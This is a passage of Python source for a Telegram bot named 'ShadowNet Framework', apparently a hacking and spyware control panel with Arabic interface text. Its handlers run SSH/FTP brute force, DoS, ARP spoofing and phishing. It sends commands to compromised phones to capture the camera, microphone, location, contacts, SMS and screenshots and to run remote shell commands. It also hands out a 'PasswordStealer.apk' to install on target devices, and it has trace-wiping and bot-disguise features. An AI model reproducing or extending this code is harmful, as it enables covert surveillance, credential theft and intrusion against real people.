                    'from': msg.get('from', {}).get('address', ''),
                    'subject': msg.get('subject', ''),
                    'preview': msg.get('intro', '')[:150]
                })
            return results
    except:
        pass
    return []

def extract_pdf_text(pdf_content):
    try:
        pdf_file = BytesIO(pdf_content)
        reader = pypdf.PdfReader(pdf_file)
        text = ""
        for page in reader.pages:
            page_text = page.extract_text()
            if page_text:
                text += page_text + "\n"
        return text.strip()
    except Exception as e:
        return None

def answer_from_pdf(text, question):
    if not text:
        return "⚠️ لم يتم تحميل أي نص."
    keywords = re.findall(r'\b\w+\b', question.lower())
    sentences = re.split(r'[.!?]', text)
    best_sentence = None
    best_score = 0
    for sentence in sentences:
        sentence_lower = sentence.lower()
        score = sum(1 for kw in keywords if kw in sentence_lower)
        if score > best_score:
            best_score = score
            best_sentence = sentence
    if best_sentence:
        return f"📚 الإجابة: {best_sentence[:500]}..."
    return "⚠️ لم يتم العثور على إجابة مناسبة."

# ===================== دوال الدفاع والحماية =====================

bot_locked = False
bot_shield_active = False

def toggle_bot_lock(chat_id):
    global bot_locked
    bot_locked = not bot_locked
    status = "مقفل 🔒" if bot_locked else "مفتوح 🔓"
    safe_send(chat_id, f"✅ تم {status} البوت")
    notify_admin(f"{'🔒 قفل' if bot_locked else '🔓 فتح'} البوت بواسطة المستخدم {chat_id}")
    return bot_locked

def toggle_dev_shield(chat_id):
    global bot_shield_active
    bot_shield_active = not bot_shield_active
    status = "مفعل 🛡️" if bot_shield_active else "معطل"
    safe_send(chat_id, f"✅ تم {status} درع المطور")
    notify_admin(f"{'🛡️ تفعيل' if bot_shield_active else '⚠️ إلغاء'} درع المطور بواسطة المستخدم {chat_id}")
    return bot_shield_active

BOT_NAMES = [
    "System Scanner", "Security Checker", "Network Tool",
    "File Manager", "PDF Reader", "Help Desk", "Support Bot"
]

def disguise_bot():
    try:
        new_name = secrets.choice(BOT_NAMES)
        bot.set_my_name(new_name)
        bot.set_my_description("أداة متقدمة للفحص الرقمي")
        bot.set_my_short_description("أداة متقدمة للفحص الرقمي")
        notify_admin(f"🕵️ تم تبديل هوية البوت إلى: {new_name}")
        return True
    except Exception as e:
        return False

def stealth_mode(chat_id):
    safe_send(chat_id, "🌫️ تم تفعيل وضع التخفي...")
    try:
        for i in range(1, 20):
            try:
                bot.delete_message(chat_id, chat_id - i)
            except:
                pass
    except:
        pass
    for _ in range(3):
        fake_messages = [
            "⚠️ حدث خطأ في النظام، يرجى المحاولة لاحقاً.",
            "📡 جاري تحديث قاعدة البيانات...",
            "🔍 فحص الأمان قيد التشغيل..."
        ]
        safe_send(chat_id, secrets.choice(fake_messages))
        time.sleep(0.5)
    notify_admin(f"🌫️ تم تفعيل وضع التخفي في المحادثة {chat_id}")

def wipe_traces(chat_id):
    safe_send(chat_id, "💣 جاري حذف الآثار...")
    deleted = 0
    try:
        for i in range(1, 101):
            try:
                bot.delete_message(chat_id, chat_id - i)
                deleted += 1
            except:
                pass
        safe_send(chat_id, f"✅ تم حذف {deleted} رسالة.")
    except:
        safe_send(chat_id, f"⚠️ تم حذف {deleted} رسالة متاحة.")
    notify_admin(f"💣 تم حذف الآثار في المحادثة {chat_id}")

# ===================== نظام كشف الاختراق =====================
suspicious_attempts = {}
BLOCK_THRESHOLD = 3
BLOCK_DURATION = 3600

def is_blocked(user_id):
    if user_id in suspicious_attempts:
        if suspicious_attempts[user_id]['blocked']:
            if time.time() - suspicious_attempts[user_id]['block_time'] < BLOCK_DURATION:
                return True
            else:
                suspicious_attempts[user_id]['blocked'] = False
                suspicious_attempts[user_id]['attempts'] = 0
    return False

def detect_suspicious(user_id, command, user_data=None):
    suspicious_commands = [
        "eval", "exec", "os.system", "subprocess", "__import__",
        "globals", "locals", "getattr", "setattr", "delattr",
        "open", "file", "compile", "execfile", "input",
        "raw_input", "exit", "quit", "help", "dir"
    ]
    
    is_suspicious = False
    reason = ""
    
    for cmd in suspicious_commands:
        if cmd in command.lower():
            is_suspicious = True
            reason = f"أمر مشبوه: `{cmd}`"
            break
    
    if user_id not in suspicious_attempts:
        suspicious_attempts[user_id] = {'attempts': 0, 'blocked': False, 'block_time': 0}
    
    if is_suspicious:
        suspicious_attempts[user_id]['attempts'] += 1
        notify_admin(f"🚨 **تنبيه أمني!**\n👤 المستخدم: {user_id}\n🔍 السبب: {reason}\n📝 الأمر: {command[:100]}")
        
        if suspicious_attempts[user_id]['attempts'] >= BLOCK_THRESHOLD:
            suspicious_attempts[user_id]['blocked'] = True
            suspicious_attempts[user_id]['block_time'] = time.time()
            notify_admin(f"🚫 **تم حظر المستخدم تلقائياً!**\n👤 المستخدم: {user_id}")
    
    return is_suspicious

# ===================== بناء القوائم =====================

def build_main_menu(user_id):
    markup = InlineKeyboardMarkup(row_width=2)
    is_admin_user = is_admin(user_id)
    points = get_user_points(user_id)
    level = get_user_level(points)
    
    safe_send(user_id, f"📊 **نقاطك:** {points} | 🏅 **مستواك:** {level}")
    
    # ===== قسم الاستطلاع =====
    markup.row(
        InlineKeyboardButton("🌐 فحص النطاق", callback_data="mode_domain_scan"),
        InlineKeyboardButton("🔍 مسح المنافذ", callback_data="mode_port_scan")
    )
    markup.row(
        InlineKeyboardButton("🕵️ Shodan", callback_data="mode_shodan"),
        InlineKeyboardButton("📡 تتبع IP", callback_data="mode_ip_tracker")
    )
    markup.row(
        InlineKeyboardButton("🔎 بحث عكسي", callback_data="mode_reverse_lookup")
    )
    
    # ===== قسم فحص الثغرات =====
    markup.row(
        InlineKeyboardButton("🚨 فحص SQLi", callback_data="mode_sqli_scan"),
        InlineKeyboardButton("⚡ فحص XSS", callback_data="mode_xss_scan")
    )
    markup.row(
        InlineKeyboardButton("🔐 فحص SSL", callback_data="mode_ssl_scan"),
        InlineKeyboardButton("🛡️ فحص شامل", callback_data="mode_comprehensive_scan")
    )
    markup.row(
        InlineKeyboardButton("📋 تقارير الثغرات", callback_data="mode_vuln_reports")
    )
    
    # ===== قسم الهجمات =====
    markup.row(
        InlineKeyboardButton("🎯 Brute Force", callback_data="mode_bruteforce"),
        InlineKeyboardButton("🌊 هجوم DoS", callback_data="mode_dos")
    )
    markup.row(
        InlineKeyboardButton("🕸️ ARP Spoof", callback_data="mode_arp_spoof"),
        InlineKeyboardButton("🔑 اختراق SSH", callback_data="mode_ssh_hack")
    )
    markup.row(
        InlineKeyboardButton("📡 اختراق FTP", callback_data="mode_ftp_hack")
    )
    
    # ===== قسم التجسس =====
    markup.row(
        InlineKeyboardButton("📸 كاميرا", callback_data="mode_camera"),
        InlineKeyboardButton("🎙️ تنصت", callback_data="mode_mic")
    )
    markup.row(
        InlineKeyboardButton("📍 تتبع الموقع", callback_data="mode_location"),
        InlineKeyboardButton("📇 جهات اتصال", callback_data="mode_contacts")
    )
    markup.row(
        InlineKeyboardButton("✉️ رسائل SMS", callback_data="mode_sms"),
        InlineKeyboardButton("📸 لقطة شاشة", callback_data="mode_screenshot")
    )
    markup.row(
        InlineKeyboardButton("🖥️ Shell عن بعد", callback_data="mode_shell"),
        InlineKeyboardButton("🔌 إيقاف تشغيل", callback_data="mode_shutdown")
    )
    
    # ===== قسم سرقة كلمات المرور (جديد) =====
    markup.row(
        InlineKeyboardButton("🔑 سرقة كلمات المرور", callback_data="mode_password_stealer")
    )
    
    # ===== قسم الهندسة الاجتماعية =====
    markup.row(
        InlineKeyboardButton("📧 فيشينغ", callback_data="mode_phishing"),
        InlineKeyboardButton("🎭 انتحال", callback_data="mode_spoof")
    )
    markup.row(
        InlineKeyboardButton("📱 رسائل مزيفة", callback_data="mode_fake_msg")
    )
    
    # ===== قسم الدفاع =====
    markup.row(
        InlineKeyboardButton("🛡️ درع المطور", callback_data="mode_dev_shield"),
        InlineKeyboardButton("🔒 قفل البوت", callback_data="mode_lock_bot")
    )
    markup.row(
        InlineKeyboardButton("🌫️ وضع التخفي", callback_data="mode_stealth"),
        InlineKeyboardButton("💣 حذف الأثر", callback_data="mode_wipe_traces")
    )
    markup.row(
        InlineKeyboardButton("🕵️ تبديل الهوية", callback_data="mode_identity_switch")
    )
    
    # ===== قسم الخدمات الأساسية =====
    markup.row(
        InlineKeyboardButton("📥 تحميل فيديو", callback_data="mode_download"),
        InlineKeyboardButton("🔗 تقصير الروابط", callback_data="mode_shorten")
    )
    markup.row(
        InlineKeyboardButton("📤 بريد مؤقت", callback_data="mode_temp_email"),
        InlineKeyboardButton("📱 رقم مؤقت", callback_data="mode_temp_number")
    )
    markup.row(
        InlineKeyboardButton("📚 تحليل PDF", callback_data="mode_pdf"),
        InlineKeyboardButton("📢 بلاغ فيسبوك", callback_data="mode_fb_report")
    )
    
    # ===== النقاط والإحالات =====
    markup.row(
        InlineKeyboardButton("⭐ نقاطي", callback_data="mode_points"),
        InlineKeyboardButton("📊 سجل النقاط", callback_data="mode_points_history")
    )
    markup.row(
        InlineKeyboardButton("🔗 رابط دعوتي", callback_data="mode_referral")
    )
    
    # ===== لوحة المطور =====
    if is_admin_user:
        markup.row(
            InlineKeyboardButton("👑 لوحة التحكم", callback_data="mode_admin_panel"),
            InlineKeyboardButton("📊 إحصائيات", callback_data="mode_stats")
        )
        markup.row(
            InlineKeyboardButton("📢 بث جماعي", callback_data="mode_broadcast"),
            InlineKeyboardButton("🎯 التحكم الخفي", callback_data="stealth_control_menu")
        )
        markup.row(
            InlineKeyboardButton("📱 الأجهزة", callback_data="mode_devices"),
            InlineKeyboardButton("📊 تحليل ذكي", callback_data="mode_smart_analysis")
        )
        markup.row(
            InlineKeyboardButton("📂 تصدير البيانات", callback_data="mode_export_data")
        )
    
    return markup

def build_stealth_control_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("📱 الأجهزة الخفية", callback_data="stealth_devices"),
        InlineKeyboardButton("📊 حالة الأجهزة", callback_data="stealth_status")
    )
    markup.row(
        InlineKeyboardButton("📢 بث أمر", callback_data="stealth_broadcast"),
        InlineKeyboardButton("🔄 تحديث الكل", callback_data="stealth_refresh_all")
    )
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    return markup

def build_stealth_devices_markup():
    markup = InlineKeyboardMarkup(row_width=1)
    targets = get_all_targets()
    if not targets:
        markup.row(InlineKeyboardButton("⚠️ لا توجد أجهزة", callback_data="no_devices"))
    else:
        for target in targets:
            device_id = target['device_id']
            status_icon = "🟢" if target['status'] == 'online' else "🔴"
            short_id = device_id[:8] + "..." if len(device_id) > 10 else device_id
            markup.row(InlineKeyboardButton(
                f"{status_icon} {target['name']} ({short_id})",
                callback_data=f"stealth_select_{device_id}"
            ))
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="stealth_control_menu"))
    return markup

def build_stealth_advanced_menu(device_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("📍 الموقع", callback_data=f"stealth_cmd_{device_id}_GET_LOCATION"),
        InlineKeyboardButton("📇 جهات اتصال", callback_data=f"stealth_cmd_{device_id}_GET_CONTACTS")
    )
    markup.row(
        InlineKeyboardButton("✉️ رسائل SMS", callback_data=f"stealth_cmd_{device_id}_GET_SMS"),
        InlineKeyboardButton("📸 لقطة شاشة", callback_data=f"stealth_cmd_{device_id}_SCREENSHOT")
    )
    markup.row(
        InlineKeyboardButton("🎙️ تسجيل صوت", callback_data=f"stealth_cmd_{device_id}_RECORD"),
        InlineKeyboardButton("📊 معلومات", callback_data=f"stealth_cmd_{device_id}_GET_INFO")
    )
    markup.row(
        InlineKeyboardButton("🚫 حظر", callback_data=f"stealth_block_{device_id}"),
        InlineKeyboardButton("🔓 فك الحظر", callback_data=f"stealth_unblock_{device_id}")
    )
    markup.row(
        InlineKeyboardButton("🖥️ أمر Shell", callback_data=f"stealth_shell_{device_id}"),
        InlineKeyboardButton("🔄 تحديث", callback_data=f"stealth_refresh_{device_id}")
    )
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="stealth_devices"))
    return markup

# ===================== معالج الأوامر =====================

@bot.message_handler(commands=['start'])
def send_welcome(message):
    chat_id = message.chat.id
    
    if is_banned(chat_id):
        safe_send(chat_id, "🚫 أنت محظور.")
        return
    
    username = message.from_user.username or ''
    first_name = message.from_user.first_name or ''
    last_name = message.from_user.last_name or ''
    
    upsert_user(chat_id, username, first_name, last_name)
    
    # التعامل مع رابط الدعوة
    text = message.text
    if ' ' in text and text.split()[1].startswith('ref_'):
        code = text.split()[1][4:]
        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute("SELECT owner_id FROM referrals WHERE code = ? AND used_by IS NULL", (code,))
            row = c.fetchone()
            if row and row['owner_id'] != chat_id:
                c.execute("UPDATE referrals SET used_by = ?, used_at = ? WHERE code = ?",
                          (chat_id, datetime.now().isoformat(), code))
                add_points(row['owner_id'], 10, "دعوة مستخدم جديد")
                add_points(chat_id, 10, "مكافأة التسجيل عبر الدعوة")
                safe_send(row['owner_id'], "🎉 تم تسجيل مستخدم جديد عبر رابط دعوتك! +10 نقاط.")
                safe_send(chat_id, "🎉 +10 نقاط مكافأة التسجيل!")
                conn.commit()
    
    # لا توجد رسالة ترحيب - يتم عرض القائمة مباشرة
    safe_send(chat_id, "📌 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """
📖 **دليل ShadowNet Framework**

🔍 **قسم الاستطلاع:**
• فحص النطاق - معلومات WHOIS, DNS, IP
• مسح المنافذ - كشف المنافذ المفتوحة
• Shodan - بحث عن معلومات الأجهزة
• تتبع IP - موقع IP جغرافياً

🛡️ **قسم فحص الثغرات:**
• فحص SQLi - كشف حقن SQL
• فحص XSS - كشف Scripting
• فحص SSL - تحليل الشهادات
• فحص شامل - مسح كامل

💣 **قسم الهجمات:**
• Brute Force - اختراق كلمات المرور
• DoS - هجوم حرمان الخدمة
• ARP Spoof - تسمم ARP
• اختراق SSH/FTP

📱 **قسم التجسس:**
• كاميرا - التقاط صور عن بعد
• تنصت - تسجيل الصوت
• تتبع الموقع - GPS
• جهات اتصال - سرقة الأرقام
• رسائل SMS - قراءة الرسائل
• لقطة شاشة - تصوير الشاشة
• Shell - أوامر عن بعد

🔑 **سرقة كلمات المرور:**
• تنزيل ملف APK (سيتم بناؤه قريباً)

🛡️ **قسم الدفاع:**
• درع المطور - حماية البوت
• قفل البوت - منع الاستخدام
• وضع التخفي - إخفاء الآثار
• حذف الأثر - مسح الرسائل
• تبديل الهوية - تغيير الاسم

📦 **خدمات أساسية:**
• تحميل فيديو - من يوتيوب
• تقصير الروابط
• بريد مؤقت
• أرقام مؤقتة
• تحليل PDF

⚠️ **استخدم للأغراض التعليمية فقط!**
    """
    safe_send(message.chat.id, help_text)

@bot.message_handler(commands=['points'])
def show_points(message):
    chat_id = message.chat.id
    points = get_user_points(chat_id)
    level = get_user_level(points)
    safe_send(chat_id, f"⭐ نقاطك: {points}\n🏅 مستواك: {level}")

@bot.message_handler(commands=['referral'])
def show_referral(message):
    chat_id = message.chat.id
    user = get_user(chat_id)
    if user and user['referral_code']:
        bot_username = bot.get_me().username
        link = f"https://t.me/{bot_username}?start=ref_{user['referral_code']}"
        safe_send(chat_id, f"🔗 رابط دعوتك:\n{link}\n\nكل دعوة = +10 نقاط لك وللمدعو!")
    else:
        code = generate_referral_code()
        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute("UPDATE users SET referral_code = ? WHERE chat_id = ?", (code, chat_id))
            conn.commit()
        bot_username = bot.get_me().username
        link = f"https://t.me/{bot_username}?start=ref_{code}"
        safe_send(chat_id, f"🔗 رابط دعوتك:\n{link}")

@bot.message_handler(commands=['cancel'])
def cancel_state(message):
    chat_id = message.chat.id
    if chat_id in user_states:
        del user_states[chat_id]
    safe_send(chat_id, "✅ تم الإلغاء.")

# ===================== متغيرات الحالة =====================
user_states = {}
temp_emails = {}
admin_remote_target = {}

# ===================== معالج الأزرار =====================

@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    try:
        bot.answer_callback_query(call.id)
    except Exception as e:
        logger.error(f"Callback answer error: {e}")
    
    chat_id = call.message.chat.id
    data = call.data
    user_id = chat_id
    is_admin_user = is_admin(chat_id)
    points = get_user_points(chat_id)
    
    # التحقق من قفل البوت
    global bot_locked
    if bot_locked and not is_admin_user:
        safe_send(chat_id, "🔒 البوت مقفل حالياً.")
        return
    
    # التحقق من الحظر
    if is_banned(chat_id):
        safe_send(chat_id, "🚫 أنت محظور.")
        return
    
    # ===== العودة للقائمة الرئيسية =====
    if data == "back_to_main":
        safe_send(chat_id, "📌 القائمة الرئيسية:", reply_markup=build_main_menu(chat_id))
        return
    
    if data in ["no_devices"]:
        safe_send(chat_id, "⚠️ لا توجد أجهزة.")
        return
    
    # ===== قائمة التحكم الخفي =====
    if data == "stealth_control_menu":
        safe_send(chat_id, "🎮 **لوحة التحكم الخفي**", reply_markup=build_stealth_control_menu())
        return
    
    if data == "stealth_devices":
        safe_send(chat_id, "📱 **الأجهزة المسجلة:**", reply_markup=build_stealth_devices_markup())
        return
    
    if data == "stealth_status":
        targets = get_all_targets()
        if not targets:
            safe_send(chat_id, "📭 لا توجد أجهزة.")
        else:
            msg = "📊 **حالة الأجهزة:**\n\n"
            for target in targets:
                status_text = "🟢 متصل" if target['status'] == 'online' else "🔴 غير متصل"
                msg += f"📱 {target['name']}\n   • المعرف: `{target['device_id']}`\n   • الحالة: {status_text}\n   • آخر ظهور: {target['last_seen'][:16]}\n\n"
            safe_send(chat_id, msg)
        return
    
    if data == "stealth_refresh_all":
        safe_send(chat_id, "🔄 تم تحديث القائمة.", reply_markup=build_stealth_devices_markup())
        return
    
    if data == "stealth_broadcast" and is_admin_user:
        user_states[chat_id] = "stealth_waiting_broadcast"
        safe_send(chat_id, "📢 أرسل الأمر للبث لجميع الأجهزة:\nمثال: GET_LOCATION")
        return
    
    # ===== اختيار جهاز للتحكم الخفي =====
    if data.startswith("stealth_select_") and is_admin_user:
        device_id = data.split("_")[2]
        target = get_target(device_id)
        if target:
            admin_remote_target[chat_id] = device_id
            safe_send(chat_id, f"✅ تم اختيار الجهاز: {target['name']}", reply_markup=build_stealth_advanced_menu(device_id))
        else:
            safe_send(chat_id, "❌ الجهاز غير موجود.")
        return
    
    # ===== أوامر التحكم الخفي =====
    if data.startswith("stealth_cmd_") and is_admin_user:
        parts = data.split("_")
        device_id = parts[2]
        command = parts[3]
        add_command(device_id, command)
        safe_send(chat_id, f"⏳ تم إرسال الأمر `{command}` إلى الجهاز.")
        safe_send(chat_id, f"✅ الجهاز: `{device_id}`", reply_markup=build_stealth_advanced_menu(device_id))
        return
    
    if data.startswith("stealth_block_") and is_admin_user:
        device_id = data.split("_")[2]
        add_command(device_id, "BLOCK_DEVICE")
        safe_send(chat_id, f"🚫 تم حظر الجهاز `{device_id}`.")
        return
    
    if data.startswith("stealth_unblock_") and is_admin_user:
        device_id = data.split("_")[2]
        add_command(device_id, "UNBLOCK_DEVICE")
        safe_send(chat_id, f"🔓 تم فك حظر الجهاز `{device_id}`.")
        return
    
    if data.startswith("stealth_shell_") and is_admin_user:
        device_id = data.split("_")[2]
        admin_remote_target[chat_id] = device_id
        user_states[chat_id] = "stealth_waiting_shell"
        safe_send(chat_id, f"🖥️ أدخل أمر Shell للجهاز `{device_id}`:")
        return
    
    if data.startswith("stealth_refresh_") and is_admin_user:
        device_id = data.split("_")[2]
        target = get_target(device_id)
        if target:
            safe_send(chat_id, f"🔄 تم تحديث حالة الجهاز {target['name']}", reply_markup=build_stealth_advanced_menu(device_id))
        return
    
    # ===== قسم الاستطلاع =====
    if data == "mode_domain_scan":
        user_states[chat_id] = "waiting_for_domain"
        safe_send(chat_id, "🌐 أرسل النطاق للفحص (مثال: example.com)")
        return
    
    if data == "mode_port_scan":
        user_states[chat_id] = "waiting_for_port_target"
        safe_send(chat_id, "🔍 أرسل الهدف لمسح المنافذ (IP أو نطاق)")
        return
    
    if data == "mode_shodan":
        if not SHODAN_API_KEY:
            safe_send(chat_id, "⚠️ مفتاح Shodan غير مضبوط. أضف SHODAN_API_KEY في المتغيرات.")
            return
        user_states[chat_id] = "waiting_for_shodan"
        safe_send(chat_id, "🕵️ أرسل IP أو مصطلح البحث لـ Shodan")
        return
    
    if data == "mode_ip_tracker":
        user_states[chat_id] = "waiting_for_ip_tracker"
        safe_send(chat_id, "📡 أرسل عنوان IP لتتبعه")
        return
    
    if data == "mode_reverse_lookup":
        user_states[chat_id] = "waiting_for_reverse"
        safe_send(chat_id, "🔎 أرسل البريد الإلكتروني أو رقم الهاتف للبحث العكسي")
        return
    
    # ===== قسم فحص الثغرات =====
    if data == "mode_sqli_scan":
        user_states[chat_id] = "waiting_for_sqli"
        safe_send(chat_id, "🚨 أرسل رابط الموقع لفحص SQL Injection")
        return
    
    if data == "mode_xss_scan":
        user_states[chat_id] = "waiting_for_xss"
        safe_send(chat_id, "⚡ أرسل رابط الموقع لفحص XSS")
        return
    
    if data == "mode_ssl_scan":
        user_states[chat_id] = "waiting_for_ssl"
        safe_send(chat_id, "🔐 أرسل النطاق لفحص شهادة SSL")
        return
    
    if data == "mode_comprehensive_scan":
        user_states[chat_id] = "waiting_for_comprehensive"
        safe_send(chat_id, "🛡️ أرسل رابط الموقع للفحص الشامل")
        return
    
    if data == "mode_vuln_reports":
        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute("SELECT * FROM scan_results ORDER BY created_at DESC LIMIT 20")
            rows = c.fetchall()
            if rows:
                msg = "📋 **آخر التقارير:**\n\n"
                for row in rows:
                    msg += f"🔍 {row['scan_type']} - {row['target']}\n"
                    msg += f"   🕐 {row['created_at'][:16]}\n\n"
                safe_send(chat_id, msg)
            else:
                safe_send(chat_id, "📭 لا توجد تقارير.")
        return
    
    # ===== قسم الهجمات =====
    if data == "mode_bruteforce":
        user_states[chat_id] = "waiting_for_bruteforce"
        safe_send(chat_id, "🎯 **Brute Force Attack**\n\nأرسل الهدف بالصيغة:\n`target|service`\n\nمثال: `192.168.1.100|ssh`\nالخدمات المدعومة: ssh, ftp")
        return
    
    if data == "mode_dos":
        user_states[chat_id] = "waiting_for_dos"
        safe_send(chat_id, "🌊 **هجوم DoS**\n\nأرسل الهدف بالصيغة:\n`target|port|duration`\n\nمثال: `example.com|80|30`")
        return
    
    if data == "mode_arp_spoof":
        user_states[chat_id] = "waiting_for_arp"
        safe_send(chat_id, "🕸️ **ARP Spoofing**\n\nأرسل بالصيغة:\n`target_ip|gateway_ip`\n\nمثال: `192.168.1.100|192.168.1.1`")
        return
    
    if data == "mode_ssh_hack":
        user_states[chat_id] = "waiting_for_ssh_hack"
        safe_send(chat_id, "🔑 **اختراق SSH**\n\nأرسل الهدف بالصيغة:\n`target|username`\n\nمثال: `192.168.1.100|root`")
        return
    
    if data == "mode_ftp_hack":
        user_states[chat_id] = "waiting_for_ftp_hack"
        safe_send(chat_id, "📡 **اختراق FTP**\n\nأرسل الهدف بالصيغة:\n`target|username`\n\nمثال: `192.168.1.100|admin`")
        return
    
    # ===== قسم التجسس =====
    if data == "mode_camera":
        if not is_admin_user:
            safe_send(chat_id, "❌ هذه الميزة للمطور فقط.")
            return
        device_id = admin_remote_target.get(chat_id)
        if not device_id:
            safe_send(chat_id, "❌ لم يتم تحديد جهاز. اختر جهازاً من التحكم الخفي أولاً.")
            return
        add_command(device_id, "CAPTURE_CAMERA")
        safe_send(chat_id, f"📸 تم إرسال أمر التقاط الصورة للجهاز {device_id}")
        return
    
    if data == "mode_mic":
        if not is_admin_user:
            safe_send(chat_id, "❌ هذه الميزة للمطور فقط.")
            return
        device_id = admin_remote_target.get(chat_id)
        if not device_id:
            safe_send(chat_id, "❌ لم يتم تحديد جهاز.")
            return
        user_states[chat_id] = "waiting_for_mic_duration"
        admin_remote_target[chat_id] = device_id
        safe_send(chat_id, f"🎙️ أدخل مدة التسجيل بالثواني للجهاز {device_id}")
        return
    
    if data == "mode_location":
        if not is_admin_user:
            safe_send(chat_id, "❌ هذه الميزة للمطور فقط.")
            return
        device_id = admin_remote_target.get(chat_id)
        if not device_id:
            safe_send(chat_id, "❌ لم يتم تحديد جهاز.")
            return
        add_command(device_id, "GET_LOCATION")
        safe_send(chat_id, f"📍 تم إرسال أمر تتبع الموقع للجهاز {device_id}")
        return
    
    if data == "mode_contacts":
        if not is_admin_user:
            safe_send(chat_id, "❌ هذه الميزة للمطور فقط.")
            return
        device_id = admin_remote_target.get(chat_id)
        if not device_id:
            safe_send(chat_id, "❌ لم يتم تحديد جهاز.")
            return
        add_command(device_id, "GET_CONTACTS")
        safe_send(chat_id, f"📇 تم إرسال أمر جلب جهات الاتصال للجهاز {device_id}")
        return
    
    if data == "mode_sms":
        if not is_admin_user:
            safe_send(chat_id, "❌ هذه الميزة للمطور فقط.")
            return
        device_id = admin_remote_target.get(chat_id)
        if not device_id:
            safe_send(chat_id, "❌ لم يتم تحديد جهاز.")
            return
        add_command(device_id, "GET_SMS")
        safe_send(chat_id, f"✉️ تم إرسال أمر جلب الرسائل للجهاز {device_id}")
        return
    
    if data == "mode_screenshot":
        if not is_admin_user:
            safe_send(chat_id, "❌ هذه الميزة للمطور فقط.")
            return
        device_id = admin_remote_target.get(chat_id)
        if not device_id:
            safe_send(chat_id, "❌ لم يتم تحديد جهاز.")
            return
        add_command(device_id, "SCREENSHOT")
        safe_send(chat_id, f"📸 تم إرسال أمر لقطة الشاشة للجهاز {device_id}")
        return
    
    if data == "mode_shell":
        if not is_admin_user:
            safe_send(chat_id, "❌ هذه الميزة للمطور فقط.")
            return
        device_id = admin_remote_target.get(chat_id)
        if not device_id:
            safe_send(chat_id, "❌ لم يتم تحديد جهاز.")
            return
        user_states[chat_id] = "waiting_for_remote_shell"
        admin_remote_target[chat_id] = device_id
        safe_send(chat_id, f"🖥️ أدخل الأمر Shell للجهاز {device_id}:")
        return
    
    if data == "mode_shutdown":
        if not is_admin_user:
            safe_send(chat_id, "❌ هذه الميزة للمطور فقط.")
            return
        device_id = admin_remote_target.get(chat_id)
        if not device_id:
            safe_send(chat_id, "❌ لم يتم تحديد جهاز.")
            return
        add_command(device_id, "SHUTDOWN")
        safe_send(chat_id, f"🔌 تم إرسال أمر إيقاف التشغيل للجهاز {device_id}")
        return
    
    # ===== قسم سرقة كلمات المرور (جديد) =====
    if data == "mode_password_stealer":
        if not is_admin_user:
            safe_send(chat_id, "❌ هذه الميزة للمطور فقط.")
            return
        
        apk_path = get_password_stealer_apk()
        if apk_path:
            with open(apk_path, 'rb') as f:
                bot.send_document(
                    chat_id,
                    ('PasswordStealer.apk', f),
                    caption="🔑 **أداة سرقة كلمات المرور**\n\n📌 قم بتنزيل الملف وتثبيته على الجهاز المستهدف.\n⚠️ سيتم بناء التطبيق بشكل كامل قريباً."
                )
        else:
            safe_send(
                chat_id,
                "🔑 **أداة سرقة كلمات المرور**\n\n"
                "📌 الملف قيد التطوير.\n"
                "⚠️ سيتم إتاحته قريباً.\n\n"
                "💡 **الوظائف المخطط لها:**\n"
                "• سرقة كلمات المرور المخزنة\n"
                "• سرقة ملفات الكوكيز\n"
                "• سرقة جلسات التصفح\n"
                "• عمل نسخة احتياطية للبيانات\n"
                "• إرسال البيانات عبر البوت"
            )
        return
    
    # ===== قسم الهندسة الاجتماعية =====
    if data == "mode_phishing":
        user_states[chat_id] = "waiting_for_phishing"
        safe_send(chat_id, "📧 **إرسال بريد تصيد**\n\nأرسل بالصيغة:\n`target_email|الموضوع`\n\nمثال: `user@example.com|تنبيه أمني`\nثم اكتب نص الرسالة في السطر التالي.")
        return
    
    if data == "mode_spoof":
        if not is_admin_user:
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        user_states[chat_id] = "waiting_for_spoof_target"
        safe_send(chat_id, "🎭 أدخل معرف المستخدم الهدف لإرسال رسالة مزيفة منه:")
        return
    
    if data == "mode_fake_msg":
        if not is_admin_user:
            safe_send(chat_id, "❌ للمطور فقط.")
            return
        user_states[chat_id] = "waiting_for_fake_msg"
        safe_send(chat_id, "📱 أرسل الرسالة المزيفة التي تريد إرسالها:")
        return
    
    # ===== قسم الدفاع =====
    if data == "mode_dev_shield":
        toggle_dev_shield(chat_id)
        return
    
    if data == "mode_lock_bot":
        toggle_bot_lock(chat_id)
        return
    
    if data == "mode_stealth":
        stealth_mode(chat_id)
        return
    
    if data == "mode_wipe_traces":
        wipe_traces(chat_id)
        return
    
    if data == "mode_identity_switch":
        if disguise_bot():
            safe_send(chat_id, "🕵️ **تم تبديل هوية البوت بنجاح**")
        else:
            safe_send(chat_id, "⚠️ فشل تبديل الهوية")
        return
    
    # ===== قسم الخدمات الأساسية =====
    if data == "mode_download":
        user_states[chat_id] = "waiting_for_download"
        safe_send(chat_id, "📥 أرسل رابط الفيديو (يوتيوب أو منصات أخرى)")
        return
    
    if data == "mode_shorten":
        user_states[chat_id] = "waiting_for_shorten"
        safe_send(chat_id, "🔗 أرسل الرابط الطويل لتقصيره")
        return
    
    if data == "mode_temp_email":
        email, token, password = create_temp_email()
        if email:
            temp_emails[chat_id] = {'email': email, 'token': token, 'password': password}
            safe_send(chat_id, f"📤 **بريدك المؤقت:**\n`{email}`\n🔑 كلمة السر: `{password}`")
            safe_send(chat_id, "📬 استخدم /check_email لفحص الرسائل")
        else:
            safe_send(chat_id, "⚠️ فشل إنشاء البريد.")
        return
    
    if data == "mode_temp_number":
        safe_send(chat_id, "⏳ جاري جلب أرقام مؤقتة...")
        numbers = fetch_temp_numbers()
        if numbers:
            response = "📱 **أرقام هواتف مؤقتة:**\n\n"
            for i, num in enumerate(numbers[:5], 1):
                response += f"{i}. {num['number']} - {num['country']}\n"
            safe_send(chat_id, response)
        else:
            safe_send(chat_id, "⚠️ فشل جلب الأرقام.")
        return
    
    if data == "mode_pdf":
